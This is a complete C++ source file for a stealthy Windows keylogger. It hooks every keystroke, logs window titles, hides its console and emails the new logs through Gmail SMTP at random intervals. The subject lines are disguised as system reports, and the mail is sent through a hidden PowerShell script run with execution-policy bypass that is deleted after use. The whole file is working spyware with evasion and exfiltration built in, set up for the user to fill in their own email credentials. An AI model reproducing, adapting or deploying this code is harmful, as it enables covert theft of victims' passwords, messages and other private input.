#define UNICODE
#include <Windows.h>
#include <wininet.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <vector>
#include <thread>
#include <chrono>

#include <random>

// Email configuration
const std::string SMTP_SERVER = "smtp.gmail.com";
const std::string SMTP_PORT = "587";
const std::string EMAIL_FROM = "exampleSender@gmail.com";          // CAMBIAR POR TU EMAIL
const std::string EMAIL_PASSWORD = "aaaa aaaa aaaa aaaa";         // CAMBIAR POR TU APP PASSWORD
const std::string EMAIL_TO = "exampleRecipient@gmail.com";       // CAMBIAR POR EMAIL DESTINO
const int EMAIL_INTERVAL_MIN_MINUTES = 30;                   // Mínimo 30 minutos
const int EMAIL_INTERVAL_MAX_MINUTES = 120;                  // Máximo 120 minutos

// defines whether the window is visible or not
#define invisible // (visible / invisible)
// Defines whether you want to enable or disable 
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)
// defines which format to use for logging
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore

#if FORMAT == 0
const std::map<int, std::string> keyname{ 
	{VK_BACK, "[BACKSPACE]" },
	{VK_RETURN,	"\n" },
	{VK_SPACE,	"_" },
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	"[LSHIFT]" },
	{VK_RSHIFT,	"[RSHIFT]" },
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCONTROL]" },
	{VK_RCONTROL,	"[RCONTROL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	"[ESCAPE]" },
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
	{VK_OEM_PERIOD,	"." },
	{VK_DECIMAL,	"." },
	{VK_OEM_PLUS,	"+" },
	{VK_OEM_MINUS,	"-" },
	{VK_ADD,		"+" },
	{VK_SUBTRACT,	"-" },
	{VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif

HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file;

char output_filename[32];
int cur_hour = -1;
std::vector<std::string> log_files_created;
time_t last_email_sent = 0;

// Function to encode string to Base64 (simple implementation)
std::string base64_encode(const std::string &in) {
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

// Function to generate random interval between min and max minutes
int getRandomInterval() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(EMAIL_INTERVAL_MIN_MINUTES, EMAIL_INTERVAL_MAX_MINUTES);
    return dis(gen);
}

// Function to generate varied email subject
std::string generateRandomSubject() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    
    std::vector<std::string> subjects = {
        "System Activity Report",
        "Daily System Log",
        "Security Monitor Update", 
        "System Status Report",
        "Activity Summary",
        "System Monitor Log",
        "Security Update Report",
        "Daily Activity Summary",
        "System Health Report",
        "Monitor Status Update"
    };
    
    std::uniform_int_distribution<> dis(0, subjects.size() - 1);
    
    // Add timestamp variation
    auto now = std::chrono::system_clock::now();
    std::time_t time = std::chrono::system_clock::to_time_t(now);
    struct tm tm_info;
    localtime_s(&tm_info, &time);
    
    char timeStr[64];
    strftime(timeStr, sizeof(timeStr), "%m/%d %H:%M", &tm_info);
    
    return subjects[dis(gen)] + " - " + std::string(timeStr);
}

// Structure to store file positions
struct FilePosition {
    std::string filename;
    long position;
    time_t last_sent;
};

// Function to save file positions to control file
void saveFilePositions(const std::vector<FilePosition>& positions) {
    std::ofstream file("logs\\.email_positions");
    if (file.is_open()) {
        for (const auto& pos : positions) {
            file << pos.filename << "|" << pos.position << "|" << pos.last_sent << "\n";
        }
        file.close();
    }
}

// Function to load file positions from control file
std::vector<FilePosition> loadFilePositions() {
    std::vector<FilePosition> positions;
    std::ifstream file("logs\\.email_positions");
    
    if (!file.is_open()) {
        return positions; // Return empty if file doesn't exist
    }
    
    std::string line;
    while (std::getline(file, line)) {
        size_t pos1 = line.find('|');
        size_t pos2 = line.find('|', pos1 + 1);
        
        if (pos1 != std::string::npos && pos2 != std::string::npos) {
            FilePosition fp;
            fp.filename = line.substr(0, pos1);
            fp.position = std::stol(line.substr(pos1 + 1, pos2 - pos1 - 1));
            fp.last_sent = std::stol(line.substr(pos2 + 1));
            positions.push_back(fp);
        }
    }
    file.close();
    return positions;
}

// Function to read only new content from specific file position
std::string readNewContentFromPosition(const std::string& filename, long start_position) {
    std::ifstream file(filename, std::ios::binary);
    if (!file.is_open()) return "";
    
    // Get file size
    file.seekg(0, std::ios::end);
    long file_size = file.tellg();
    
    // If file is smaller than start_position, file might have been recreated
    if (file_size < start_position) {
        start_position = 0; // Read from beginning
    }
    
    // Move to start position
    file.seekg(start_position);
    
    // Read from position to end
    std::stringstream buffer;
    buffer << file.rdbuf();
    
    return buffer.str();
}

// Function to check internet connectivity
bool hasInternetConnection() {
    return InternetCheckConnectionA("http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0);
}

// Function to send email using PowerShell (simplified approach)
bool sendEmailViaPowerShell(const std::string& logContent) {
    // Create a temporary PowerShell script
    std::ofstream ps_script("temp_email.ps1");
    if (!ps_script.is_open()) return false;
    
    // Generate random subject
    std::string subject = generateRandomSubject();
    
    ps_script << "$secpasswd = ConvertTo-SecureString \"" << EMAIL_PASSWORD << "\" -AsPlainText -Force\n";
    ps_script << "$credential = New-Object System.Management.Automation.PSCredential(\"" << EMAIL_FROM << "\", $secpasswd)\n";
    ps_script << "$body = @\"\n" << logContent << "\n\"@\n";
    ps_script << "try {\n";
    ps_script << "    Send-MailMessage -From \"" << EMAIL_FROM << "\" -To \"" << EMAIL_TO << "\" ";
    ps_script << "-Subject \"" << subject << "\" -Body $body ";
    ps_script << "-SmtpServer \"" << SMTP_SERVER << "\" -Port " << SMTP_PORT << " ";
    ps_script << "-UseSsl -Credential $credential\n";
    ps_script << "    Write-Host \"Email sent successfully\"\n";
    ps_script << "} catch {\n";
    ps_script << "    Write-Host \"Error sending email: $($_.Exception.Message)\"\n";
    ps_script << "}\n";
    ps_script.close();
    
    // Execute PowerShell script silently
    int result = system("powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File temp_email.ps1 > nul 2>&1");
    
    // Clean up
    DeleteFileA("temp_email.ps1");
    
    return result == 0;
}

// Function to collect and send logs
void emailLogsSender() {
    while (true) {
        // Generate random interval and wait
        int randomMinutes = getRandomInterval();
        std::cout << "Next email in " << randomMinutes << " minutes..." << std::endl;
        std::this_thread::sleep_for(std::chrono::minutes(randomMinutes));
        
        // Load previous file positions
        std::vector<FilePosition> filePositions = loadFilePositions();
        std::vector<FilePosition> newPositions;
        
        // Collect only NEW content from each file
        std::string newLogs = "";
        bool hasNewContent = false;
        
        WIN32_FIND_DATAA findFileData;
        HANDLE hFind = FindFirstFileA("logs\\*.log", &findFileData);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::string filename = "logs\\" + std::string(findFileData.cFileName);
                
                // Find previous position for this file
                long startPosition = 0;
                for (const auto& fp : filePositions) {
                    if (fp.filename == filename) {
                        startPosition = fp.position;
                        break;
                    }
                }
                
                // Read only new content from this position
                std::string newContent = readNewContentFromPosition(filename, startPosition);
                
                if (!newContent.empty()) {
                    hasNewContent = true;
                    newLogs += "\n=== NEW in " + std::string(findFileData.cFileName) + " ===\n";
                    newLogs += newContent;
                }
                
                // Get current file size for next time
                std::ifstream file(filename, std::ios::binary | std::ios::ate);
                long currentSize = 0;
                if (file.is_open()) {
                    currentSize = file.tellg();
                    file.close();
                }
                
                // Save new position
                FilePosition newPos;
                newPos.filename = filename;
                newPos.position = currentSize;
                newPos.last_sent = time(NULL);
                newPositions.push_back(newPos);
                
            } while (FindNextFileA(hFind, &findFileData) != 0);
            FindClose(hFind);
        }
        
        if (hasNewContent) {
            // Check internet connection before attempting to send
            if (!hasInternetConnection()) {
                std::cout << "No internet connection. Skipping email send." << std::endl;
                continue; // Skip this cycle, don't update positions
            }
            
            // Add timestamp info to email
            char timeStr[64];
            struct tm tm_info;
            time_t current_time = time(NULL);
            localtime_s(&tm_info, &current_time);
            strftime(timeStr, sizeof(timeStr), "%Y-%m-%d %H:%M:%S", &tm_info);
            
            std::string emailBody = "=== KEYLOGGER INCREMENTAL REPORT ===\n";
            emailBody += "Time: " + std::string(timeStr) + "\n";
            emailBody += "Only NEW activity since last report:\n";
            emailBody += newLogs;
            
            std::cout << "Sending ONLY NEW content via email..." << std::endl;
            if (sendEmailViaPowerShell(emailBody)) {
                std::cout << "New content sent successfully!" << std::endl;
                
                // Save the new positions only after successful email
                saveFilePositions(newPositions);
            } else {
                std::cout << "Failed to send new content via email." << std::endl;
            }
        } else {
            std::cout << "No new activity to report." << std::endl;
        }
    }
}

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
			Save(kbdStruct.vkCode);
		}
	}
	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCWSTR a = L"Failed to install hook!";
		LPCWSTR b = L"Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
	std::stringstream output;
	static char lastwindow[256] = "";
#ifndef mouseignore 
	if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0;
	}
#endif
	HWND foreground = GetForegroundWindow();
	DWORD threadID;
	HKL layout = NULL;
	
	struct tm tm_info;
	const time_t t = time(NULL);
	localtime_s(&tm_info, &t);

	if (foreground)
	{
		threadID = GetWindowThreadProcessId(foreground, NULL);
		layout = GetKeyboardLayout(threadID);
	}

	if (foreground)
	{
		char window_title[256];
		GetWindowTextA(foreground, (LPSTR)window_title, 256);

		if (strcmp(window_title, lastwindow) != 0)
		{
			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
			char s[64];
			strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
		}
	}

#if FORMAT == 10
	output << '[' << key_stroke << ']';
#elif FORMAT == 16
	output << std::hex << "[" << key_stroke << ']';
#else
	if (keyname.find(key_stroke) != keyname.end())
	{
		output << keyname.at(key_stroke);
	}
	else
	{
		char key;
		bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
			|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
		{
			lowercase = !lowercase;
		}

		key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

		if (!lowercase)
		{
			key = tolower(key);
		}
		output << char(key);
	}
#endif
	
	if (cur_hour != tm_info.tm_hour) {
		cur_hour = tm_info.tm_hour;
		output_file.close();
		strftime(output_filename, sizeof(output_filename), "logs/%Y-%m-%d__%H-%M-%S.log", &tm_info);
		output_file.open(output_filename, std::ios_base::app);
		std::cout << "Logging output to " << output_filename << std::endl;
	}

	output_file << output.str();
	output_file.flush();

	std::cout << output.str();

	return 0;
}

void Stealth()
{
#ifdef visible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
#endif

#ifdef invisible
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
	FreeConsole();
#endif
}

bool IsSystemBooting() 
{
	return GetSystemMetrics(0x2004) != 0;
}

int main()
{
	// Ensure logs directory exists
	CreateDirectoryA("logs", NULL);
	
	Stealth(); 
	
	#ifdef bootwait
	while (IsSystemBooting()) 
	{
		std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
		Sleep(10000);
	}
	#endif
	#ifdef nowait
		std::cout << "Skipping boot metrics check.\n";
	#endif

	// Start email sender thread
	std::thread emailThread(emailLogsSender);
	emailThread.detach(); // Run in background
	
	SetHook();

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
	}
	
	return 0;
}
